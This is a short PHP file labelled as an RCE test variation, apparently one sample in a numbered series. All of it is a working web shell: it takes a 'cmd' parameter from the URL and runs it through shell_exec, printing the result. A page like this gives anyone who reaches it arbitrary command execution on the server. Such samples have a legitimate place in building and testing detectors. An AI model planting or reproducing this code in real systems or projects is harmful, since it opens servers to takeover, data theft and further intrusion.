<?php
// RCE test variation #520
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>